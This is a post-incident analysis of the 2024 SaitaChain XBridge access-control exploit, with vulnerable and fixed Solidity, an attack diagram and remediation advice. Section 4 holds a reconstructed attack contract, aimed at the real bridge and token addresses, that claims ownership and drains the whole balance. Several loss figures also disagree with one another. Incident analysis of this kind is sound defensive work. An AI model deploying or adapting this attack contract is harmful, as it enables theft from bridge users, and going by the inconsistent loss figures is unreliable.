# SaitaChain XBridge — Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-24 |
| **Protocol** | SaitaChain XBridge |
| **Chain** | Ethereum (additional losses: BNB Chain) |
| **Loss** | ~$1,000,000 (ETH) / Total ~$1,440,000 (ETH + BNB combined) |
| **Attacker** | [0x0cfc...caa7](https://etherscan.io/address/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7) |
| **Attack TX** | [0x903d...0bfc](https://etherscan.io/tx/0x903d88a92cbc0165a73fd1e47b35a3ad46e9b49e8b7bbada7f13668c3e3d0bfc) |
| **Vulnerable Contract** | [0x354c...cB8C](https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c) (XBridge4) |
| **Root Cause** | In `listToken()`, when `_baseToken == _correspondingToken`, the token owner (`_tokenOwner`) can be set without any caller validation → subsequent `withdrawTokens()` call drains assets |
| **PoC Source** | DeFiHackLabs (no PoC exists for this date) / [Neptune Mutual Analysis](https://medium.com/neptune-mutual/understanding-the-xbridge-exploit-d3d56c0dc19c) |

---

## 1. Vulnerability Overview

SaitaChain's XBridge is a cross-chain bridge protocol connecting Ethereum and BNB Chain. Users can lock tokens on one chain and receive tokens of equivalent value on the other chain.

**Core Issue**: The `listToken()` function in the `XBridge4` contract provides functionality for registering tokens to the bridge. Inside this function, there is a special branch for the case where `_baseToken` and `_correspondingToken` are identical (`_baseToken == _correspondingToken`). In this branch, the contract registers `msg.sender` as the owner of that token (`_tokenOwner[_baseToken]`).

**Critical Vulnerability**: This branch has no validation whatsoever. That is, **anyone can call `listToken()` by passing the same address for both `_baseToken` and `_correspondingToken` and register themselves as the owner of that token**.

The attacker exploited this to register themselves as the owner of STC (SaitaChain Token), then called `withdrawTokens()` to drain the entire STC token balance deposited in the contract.

This attack was executed a total of three times, with each attack consisting of two transactions (ownership registration + withdrawal).

---

## 2. Vulnerable Code Analysis

### 2.1 `listToken()` — Missing Owner Validation

```solidity
// ❌ Vulnerable code — XBridge4.sol (reconstructed vulnerable logic)
function listToken(
    address _baseToken,      // Base chain token address
    address _correspondingToken,  // Corresponding chain token address
    bool _isMintable         // Whether the corresponding token uses minting
) external payable {
    // ... fee processing and other logic ...

    // ❌ Core vulnerability:
    //    When _baseToken == _correspondingToken,
    //    msg.sender is registered as token owner regardless of who they are.
    //    No validation is performed to check whether the caller is the actual
    //    token owner or has any authorization.
    if (_baseToken == _correspondingToken) {
        _tokenOwner[_baseToken] = msg.sender;  // ❌ Sets arbitrary address as owner
    }

    // ... token registration processing ...
}
```

```solidity
// ✅ Fixed code
function listToken(
    address _baseToken,
    address _correspondingToken,
    bool _isMintable
) external payable {
    // ✅ Even in the _baseToken == _correspondingToken case,
    //    verify that the caller is the actual token contract owner
    if (_baseToken == _correspondingToken) {
        // Option 1: Verify that the token contract's owner() is msg.sender
        require(
            IOwnable(_baseToken).owner() == msg.sender,
            "XBridge: caller is not the token owner"
        );
        // Option 2: Prevent re-registration if an owner is already set
        require(
            _tokenOwner[_baseToken] == address(0),
            "XBridge: token already listed"
        );
        _tokenOwner[_baseToken] = msg.sender;  // ✅ Register after validation
    }

    // ... token registration processing ...
}
```

**Issue**: In the branch handling the edge case where `_baseToken == _correspondingToken`, no authorization check is performed when registering `msg.sender` as the owner. An attacker can become the registered owner of any arbitrary token within the bridge contract simply by passing the same token address for both parameters.

---

### 2.2 `withdrawTokens()` — Asset Drain via Owner Privilege

```solidity
// ❌ Vulnerable code — withdrawTokens function (reconstructed vulnerable logic)
function withdrawTokens(
    address token,     // Token address to withdraw
    address receiver,  // Recipient address
    uint256 amount     // Withdrawal amount
) external {
    // Checks whether the caller is the registered owner of the token
    // → This check itself is correct, but because the _tokenOwner registration
    //   process is vulnerable, this check passes once the attacker is already
    //   registered as owner
    require(
        msg.sender == _tokenOwner[token],
        "ONLY_TOKEN_LISTER_CAN_WITHDRAW"
    );

    // ❌ This transfer succeeds because the attacker is registered as _tokenOwner
    IERC20(token).transfer(receiver, amount);
}
```

```solidity
// ✅ Fixed code (requires listToken fix as a prerequisite)
function withdrawTokens(
    address token,
    address receiver,
    uint256 amount
) external {
    require(
        msg.sender == _tokenOwner[token],
        "ONLY_TOKEN_LISTER_CAN_WITHDRAW"
    );

    // ✅ Additional safeguard: withdrawal amount cannot exceed the owner's deposited balance
    require(
        amount <= _depositedBalance[token][msg.sender],
        "XBridge: insufficient deposited balance"
    );

    _depositedBalance[token][msg.sender] -= amount;

    IERC20(token).transfer(receiver, amount);

    emit TokensWithdrawn(token, receiver, amount);
}
```

**Issue**: The owner validation logic in `withdrawTokens()` (`_tokenOwner[token]`) is structurally sound on its own. However, because the owner registration process (`listToken()`) is vulnerable, this check becomes meaningless once an attacker has already been registered as the owner. The root cause is the missing access control in `listToken()`; `withdrawTokens()` is the function subsequently abused as a result.

---

## 3. Attack Flow

### 3.1 Attack Scenario

The attack consisted of two-transaction sequences repeated a total of three times.

```
┌───────────────────────────────────────────────────────────────────────┐
│                    Step 1: Ownership Hijack Transaction                │
│               (listToken call — access control bypass)                 │
└───────────────────────────────────────────────────────────────────────┘
         │
         ▼
┌──────────────────┐
│     Attacker     │
│ 0x0cfc...caa7   │
└──────────────────┘
         │
         │  listToken(_baseToken=STC, _correspondingToken=STC, ...)
         │  ← _baseToken == _correspondingToken condition satisfied
         │
         ▼
┌────────────────────────────────────────────────────────┐
│                  XBridge4 Contract                      │
│               0x354c...cB8C                             │
│                                                        │
│  if (_baseToken == _correspondingToken) {              │
│      _tokenOwner[STC] = msg.sender  ← ❌ No-check reg  │
│  }                                                     │
│                                                        │
│  _tokenOwner[STC] = Attacker address  ← Ownership hijacked │
└────────────────────────────────────────────────────────┘
         │
         │  Ownership registration complete
         ▼
┌───────────────────────────────────────────────────────────────────────┐
│                    Step 2: Asset Drain Transaction                     │
│               (withdrawTokens call — owner privilege abuse)            │
└───────────────────────────────────────────────────────────────────────┘
         │
         ▼
┌──────────────────┐
│     Attacker     │
│ 0x0cfc...caa7   │
└──────────────────┘
         │
         │  withdrawTokens(token=STC, receiver=Attacker, amount=total_balance)
         │
         ▼
┌────────────────────────────────────────────────────────┐
│                  XBridge4 Contract                      │
│                                                        │
│  require(msg.sender == _tokenOwner[STC])               │
│  → msg.sender(Attacker) == _tokenOwner[STC](Attacker) ✅ │
│  → Check passes!                                       │
│                                                        │
│  IERC20(STC).transfer(Attacker, total_balance)         │
└────────────────────────────────────────────────────────┘
         │
         │  Entire STC token balance transferred
         ▼
┌──────────────────┐
│     Attacker     │  ← STC tokens received
│ 0x0cfc...caa7   │
└──────────────────┘
         │
         │  Attempted STC → ETH/BNB swap
         │  (only partially successful due to insufficient liquidity)
         ▼
┌───────────────────────────────────────────────────────────────────────┐
│  Final Result                                                          │
│  · ETH chain: 10.8 ETH (~$34,000) secured + remaining STC held       │
│  · BNB chain: 278.8 BNB (~$164,000) secured + remaining STC held     │
│  · Partial laundering via Tornado Cash (20 ETH, 230.1 BNB)           │
│  · Estimated total value of drained STC: ~$1,440,000                 │
└───────────────────────────────────────────────────────────────────────┘
```

### 3.2 Repeated Attack Structure

```
Attack Round 1           Attack Round 2           Attack Round 3
──────────               ──────────               ──────────
Tx A: listToken()        Tx C: listToken()        Tx E: listToken()
  └▶ _tokenOwner set       └▶ _tokenOwner set       └▶ _tokenOwner set
Tx B: withdrawTokens()   Tx D: withdrawTokens()   Tx F: withdrawTokens()
  └▶ STC drained           └▶ STC drained           └▶ STC drained
```

The attacker repeated the same pattern three times, draining assets from both the ETH chain and BNB Chain.

---

## 4. PoC Code Excerpt

No official DeFiHackLabs PoC exists, but the attack logic can be reconstructed based on publicly available analysis as follows.

```solidity
// SaitaChain XBridge Access Control Vulnerability — Attack Logic Reconstruction
// Reference: Neptune Mutual Analysis (https://medium.com/neptune-mutual/understanding-the-xbridge-exploit-d3d56c0dc19c)
// Reference: Olympix Analysis (https://olympixai.medium.com/6m-stolen-alexlab-ngfs-xbridge-and-yiedl-...)

// ────────────────────────────────────────────────────────────
// Interface declarations
// ────────────────────────────────────────────────────────────
interface IXBridge {
    // Function to register a token to the bridge — vulnerability entry point
    function listToken(
        address _baseToken,
        address _correspondingToken,
        bool _isMintable
    ) external payable;

    // Function for registered owner to withdraw tokens
    function withdrawTokens(
        address token,
        address receiver,
        uint256 amount
    ) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// ────────────────────────────────────────────────────────────
// Attack contract
// ────────────────────────────────────────────────────────────
contract SaitaChainAttack {
    // XBridge4 contract address (Ethereum)
    IXBridge constant XBRIDGE =
        IXBridge(0x354CCA2F55ddE182d36fE34D673430E226a3cB8C);

    // STC token address (SaitaChain Token)
    IERC20 constant STC =
        IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);

    // ────────────────────────────────────────────────────────
    // Step 1: Ownership hijack
    // Exploit the _baseToken == _correspondingToken condition in listToken()
    // → msg.sender is registered as _tokenOwner without any validation
    // ────────────────────────────────────────────────────────
    function step1_claimOwnership() external payable {
        // ❌ Core vulnerability exploit:
        //    Pass the same STC address for both parameters
        //    → _baseToken == _correspondingToken condition satisfied
        //    → _tokenOwner[STC] = msg.sender (attacker) is set
        XBRIDGE.listToken{value: msg.value}(
            address(STC),   // _baseToken = STC address
            address(STC),   // _correspondingToken = STC address (identical!)
            false           // _isMintable
        );
        // After this call, the attacker becomes the official owner of STC within XBridge
    }

    // ────────────────────────────────────────────────────────
    // Step 2: Asset drain
    // Withdraw entire balance using the owner privilege registered in Step 1
    // ────────────────────────────────────────────────────────
    function step2_drainTokens() external {
        // Query total STC balance in the XBridge contract
        uint256 balance = STC.balanceOf(address(XBRIDGE));

        // _tokenOwner check passes (attacker is registered as owner)
        // → XBridge transfers entire STC balance to attacker
        XBRIDGE.withdrawTokens(
            address(STC),    // Token to withdraw
            address(this),   // Recipient = attacker contract
            balance          // Entire balance
        );
    }

    // ────────────────────────────────────────────────────────
    // Collect drained tokens
    // ────────────────────────────────────────────────────────
    function collectProfit(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to, bal);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing access control in `listToken()` edge case — allows token owner registration without caller validation | CRITICAL | CWE-284 (Improper Access Control) |
| V-02 | `withdrawTokens()` owner privilege abuse — when combined with V-01, enables full balance withdrawal | CRITICAL | CWE-862 (Missing Authorization) |
| V-03 | Cross-chain bridge duplicate deployment of same vulnerability — simultaneous losses on both ETH/BNB chains | HIGH | CWE-1173 (Improper Use of Security-Relevant APIs / Insufficient Security Design) |
| V-04 | Missing events/monitoring — abnormal ownership registration cannot be detected | MEDIUM | CWE-778 (Insufficient Logging) |

### V-01 Detail: Missing Access Control in `listToken()`

- **Description**: For calls satisfying the `_baseToken == _correspondingToken` condition, `msg.sender` is unconditionally registered as the token owner. There is absolutely no validation of whether the caller is the actual token owner or holds any authorization.
- **Impact**: Anyone can register themselves as the owner of any arbitrary token deposited in the bridge.
- **Attack Conditions**: Permissionless function callable by anyone; no cost beyond gas fees.

### V-02 Detail: `withdrawTokens()` Privilege Abuse

- **Description**: The `require(msg.sender == _tokenOwner[token])` check in `withdrawTokens()` is structurally correct, but when `_tokenOwner` has been poisoned via V-01, this check passes in the attacker's favor.
- **Impact**: After V-01, the attacker can withdraw the entire token balance from the bridge.
- **Attack Conditions**: Immediately executable as a second transaction following V-01.

### V-03 Detail: Cross-Chain Duplicate Losses

- **Description**: The same vulnerable code was deployed on both Ethereum and BNB Chain, and a successful attack on one chain was immediately replicated on the other.
- **Impact**: Ethereum $830,920 + BNB Chain $416,231 = Total $1,247,151 (based on realized ETH/BNB).
- **Attack Conditions**: Cross-chain deployment from the same codebase.

---

## 6. Remediation Recommendations

### Immediate Actions

**[Action 1] `listToken()` — Add Caller Identity Validation**

```solidity
// ✅ Option A: Allow registration only by the token contract owner
function listToken(
    address _baseToken,
    address _correspondingToken,
    bool _isMintable
) external payable {
    if (_baseToken == _correspondingToken) {
        // ✅ Check the token contract's owner() to verify the caller is the actual owner
        try IOwnable(_baseToken).owner() returns (address tokenOwner) {
            require(
                tokenOwner == msg.sender,
                "XBridge: caller is not the token contract owner"
            );
        } catch {
            revert("XBridge: token does not implement Ownable");
        }

        // ✅ Prevent overwriting if an owner is already registered
        require(
            _tokenOwner[_baseToken] == address(0),
            "XBridge: token already has a registered owner"
        );
        _tokenOwner[_baseToken] = msg.sender;
    }
    // ... remaining logic
}
```

```solidity
// ✅ Option B: Restrict token registration to admin only (stricter approach)
function listToken(
    address _baseToken,
    address _correspondingToken,
    bool _isMintable
) external payable onlyOwner {
    // Only the contract owner (admin) can manage the token list
    if (_baseToken == _correspondingToken) {
        _tokenOwner[_baseToken] = msg.sender;
    }
    // ...
}
```

**[Action 2] `withdrawTokens()` — Track Deposited Balances and Enforce Withdrawal Limits**

```solidity
// ✅ Track deposited balance per owner to prevent excessive withdrawals
mapping(address => mapping(address => uint256)) private _depositedBalance;
// _depositedBalance[token][owner] = deposited amount

function withdrawTokens(
    address token,
    address receiver,
    uint256 amount
) external {
    require(
        msg.sender == _tokenOwner[token],
        "ONLY_TOKEN_LISTER_CAN_WITHDRAW"
    );
    // ✅ Only allow withdrawal up to the deposited balance
    require(
        amount <= _depositedBalance[token][msg.sender],
        "XBridge: withdrawal exceeds deposited balance"
    );

    _depositedBalance[token][msg.sender] -= amount;
    IERC20(token).transfer(receiver, amount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing access control | Add `onlyOwner` or token owner verification to the `_baseToken == _correspondingToken` branch in `listToken()` |
| V-02: Privilege abuse | Introduce per-owner deposited balance tracking mapping; enforce withdrawal limit checks |
| V-03: Cross-chain duplicate losses | Build an emergency pause mechanism that simultaneously halts all deployed chains when anomalous activity is detected on any one chain |
| V-04: Missing monitoring | Add ownership registration events (`TokenOwnerRegistered`) and integrate anomaly pattern monitoring |
| Overall design | All ownership/permission changes arising from permissionless state-mutation functions must be performed only after strict validation |

---

## 7. Lessons Learned

1. **Never omit access control for edge cases**: The `if (_baseToken == _correspondingToken)` branch may look like a special case, but every branch inside a permissionless function demands an equivalent level of access control. The assumption that "nobody would ever pass such an input" does not hold in smart contracts.

2. **Owner registration functions require the highest level of authorization checks**: Functions that grant asset withdrawal privileges within a contract must be restricted to admins (`onlyOwner`) or designed to require proof that the caller is the actual token contract owner.

3. **In cross-chain bridges, a single vulnerability leads to losses across multiple chains**: When the same codebase is deployed across multiple chains, an emergency pause mechanism that can simultaneously halt contracts on all chains must be built in advance — from the moment a vulnerability is discovered.

4. **Clearly document and audit all side effects of permissionless functions**: `listToken()` was callable by anyone, yet internally it mutated critical state in the form of token ownership. All state changes occurring in permissionless functions must be prioritized for intensive review during audits.

5. **Operate a real-time on-chain monitoring system for anomalous transactions**: This attack repeated the same pattern three times. Had a monitoring system triggered after the first attack, the second and third attacks and the BNB Chain losses could have been prevented. On-chain alerting for anomalous signals — ownership registration events, large withdrawal events — is essential.

6. **Always validate edge-case inputs in test code**: If unit tests had existed for abnormal parameter combinations like `_baseToken == _correspondingToken`, this vulnerability could have been discovered before deployment. Permissionless functions must be subjected to fuzzing tests covering all parameter combinations.

---

*References: [Neptune Mutual Analysis](https://medium.com/neptune-mutual/understanding-the-xbridge-exploit-d3d56c0dc19c) | [Olympix Analysis](https://olympixai.medium.com/6m-stolen-alexlab-ngfs-xbridge-and-yiedl-compromised-by-key-theft-and-broken-access-controls-a485c2d6c7ec) | [CryptoTimes Report](https://www.cryptotimes.io/2024/04/24/saitachains-xbridge-experienced-a-security-breach/) | [XBridge Contract (Etherscan)](https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c) | [Attacker Address (Etherscan)](https://etherscan.io/address/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7)*